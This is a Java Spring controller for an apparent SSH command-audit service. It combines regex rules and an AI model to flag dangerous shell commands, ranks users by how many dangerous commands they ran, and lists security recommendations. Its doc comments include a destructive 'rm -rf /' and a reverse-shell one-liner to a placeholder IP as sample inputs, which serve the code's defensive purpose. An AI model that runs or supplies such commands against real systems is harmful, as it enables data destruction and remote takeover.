package com.zhanghan.sshproxyproject.controller;

import com.zhanghan.sshproxyproject.common.utils.PermissionUtil;
import com.zhanghan.sshproxyproject.core.review.StaticRuleEngine;
import com.zhanghan.sshproxyproject.dto.Result;
import com.zhanghan.sshproxyproject.entity.*;
import com.zhanghan.sshproxyproject.mapper.AuditLogMapper;
import com.zhanghan.sshproxyproject.service.DeepSeekService;
import jakarta.annotation.Resource;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.*;

import java.util.*;

/**
 * AI 风险分析控制器
 * <p>
 * 提供命令审查、危险排名、策略推荐等 REST 接口
 */
@RestController
@Slf4j
@RequestMapping("/ai")
public class AIRiskController {

    @Resource
    private AuditLogMapper auditLogMapper;

    @Resource
    private DeepSeekService deepSeekService;

    @Resource
    private StaticRuleEngine staticRuleEngine;            // 静态规则引擎（新增）

    /**
     * 命令风险分析（静态规则 + AI 审查）
     *
     * <pre>
     * POST /api/ai/analyze
     * Body: { "command": "rm -rf /", "username": "guest", "role": "guest" }
     * </pre>
     *
     *
     * 静态规则引擎使用正则匹配（非旧版子串匹配），AI 审查同步执行。
     */
    @PostMapping("/analyze")
    public Result analyzeCommand(@RequestBody Map<String, String> body) {
        String command = body.get("command");
        String username = body.getOrDefault("username", "unknown");
        String role = body.getOrDefault("role", "guest");

        // ---- 参数校验 ----
        if (command == null || command.isBlank()) {
            return Result.fail("命令不能为空");
        }

        // ---- 构造用户对象 ----
        User checkUser = new User();
        checkUser.setUsername(username);
        checkUser.setRole(role);

        // ---- Phase 1: 静态审查（使用新正则引擎） ----
        StaticReviewResult staticResult = staticRuleEngine.review(command);
        boolean rolePermitted = PermissionUtil.checkUserPermission(checkUser, command);

        // ---- Phase 2: AI 审查（同步调用，REST API 场景可接受延迟） ----
        AiReviewResult aiResult = deepSeekService.reviewCommand(command, username, role);

        // ---- 综合判定 ----
        // 静态规则 BLOCK OR 角色权限不足 OR AI 判定 HIGH → 拦截
        boolean staticBlocked = staticResult.getVerdict() == ReviewVerdict.BLOCK;
        boolean finalBlocked = staticBlocked
                || !rolePermitted
                || (aiResult.isDangerous() && "HIGH".equals(aiResult.getLevel()));

        // ---- 组装返回 ----
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("command", command);
        result.put("username", username);
        result.put("role", role);
        result.put("blocked", finalBlocked);

        // 静态分析结果
        Map<String, Object> staticAnalysis = new LinkedHashMap<>();
        staticAnalysis.put("permitted", rolePermitted);
        staticAnalysis.put("verdict", staticResult.getVerdict().name());
        staticAnalysis.put("matchedRule", staticResult.getMatchedRule());
        staticAnalysis.put("reason", staticResult.getReason());
        staticAnalysis.put("matchedBlacklist", staticBlocked);  // 兼容旧字段
        result.put("staticAnalysis", staticAnalysis);

        // AI 分析结果
        Map<String, Object> aiAnalysis = new LinkedHashMap<>();
        aiAnalysis.put("dangerous", aiResult.isDangerous());
        aiAnalysis.put("level", aiResult.getLevel());
        aiAnalysis.put("reason", aiResult.getReason());
        aiAnalysis.put("category", aiResult.getCategory());
        result.put("aiAnalysis", aiAnalysis);

        // 拦截原因
        List<String> blockReasons = new ArrayList<>();
        if (staticBlocked) blockReasons.add("静态规则拦截: " + staticResult.getMatchedRule());
        if (!rolePermitted) blockReasons.add("角色权限不足");
        if (aiResult.isDangerous() && "HIGH".equals(aiResult.getLevel()))
            blockReasons.add("AI 审查判定高危: " + aiResult.getReason());
        result.put("blockReasons", blockReasons);

        log.info("命令审查完成: cmd={}, staticVerdict={}, permitted={}, aiLevel={}, finalBlocked={}",
                command, staticResult.getVerdict(), rolePermitted, aiResult.getLevel(), finalBlocked);

        return Result.ok(result);
    }

    /**
     * 危险命令用户排行榜
     */
    @GetMapping("/ranking")
    public Result getRanking() {
        List<Map<String, Object>> ranking = auditLogMapper.getDangerRanking();
        if (ranking == null) {
            ranking = new ArrayList<>();
        }

        // 转换格式
        List<Map<String, Object>> resultList = new ArrayList<>();
        for (Map<String, Object> row : ranking) {
            Map<String, Object> item = new HashMap<>();
            item.put("username", row.get("username"));
            Object countObj = row.get("danger_count");
            item.put("dangerCount", countObj != null ? Long.parseLong(countObj.toString()) : 0);
            resultList.add(item);
        }

        return Result.ok(resultList);
    }

    /**
     * AI 策略推荐
     */
    @GetMapping("/recommendations")
    public Result getRecommendations() {
        List<Map<String, String>> recommendations = new ArrayList<>();

        Map<String, String> r1 = new HashMap<>();
        r1.put("level", "HIGH");
        r1.put("content", "建议将 GUEST 角色用户限制 rm / chmod / iptables 等高危命令的使用权限");
        recommendations.add(r1);

        Map<String, String> r2 = new HashMap<>();
        r2.put("level", "HIGH");
        r2.put("content", "建议对所有 sudo 操作开启二次确认机制（MFA或审批流程）");
        recommendations.add(r2);

        Map<String, String> r3 = new HashMap<>();
        r3.put("level", "MEDIUM");
        r3.put("content", "建议限制非管理员用户执行 iptables 和 docker 相关操作");
        recommendations.add(r3);

        Map<String, String> r4 = new HashMap<>();
        r4.put("level", "MEDIUM");
        r4.put("content", "建议对 wget/curl 下载并通过管道执行的脚本增加事前安全扫描");
        recommendations.add(r4);

        Map<String, String> r5 = new HashMap<>();
        r5.put("level", "LOW");
        r5.put("content", "建议定期审计 /etc/passwd、/etc/shadow 等敏感文件的访问记录");
        recommendations.add(r5);

        Map<String, String> r6 = new HashMap<>();
        r6.put("level", "LOW");
        r6.put("content", "建议每周生成审计报告并邮件通知安全管理员");
        recommendations.add(r6);

        return Result.ok(recommendations);
    }

    /**
     * 单独测试 AI 审查（不做静态规则判定，纯看 AI 的判断）
     *
     * <pre>
     * POST /api/ai/check
     * Body: { "command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" }
     * </pre>
     */
    @PostMapping("/check")
    public Result checkByAiOnly(@RequestBody Map<String, String> body) {
        String command = body.get("command");
        String username = body.getOrDefault("username", "test-user");
        String role = body.getOrDefault("role", "guest");

        if (command == null || command.isBlank()) {
            return Result.fail("命令不能为空");
        }

        AiReviewResult aiResult = deepSeekService.reviewCommand(command, username, role);

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("command", command);
        result.put("dangerous", aiResult.isDangerous());
        result.put("level", aiResult.getLevel());
        result.put("reason", aiResult.getReason());
        result.put("category", aiResult.getCategory());

        return Result.ok(result);
    }
}
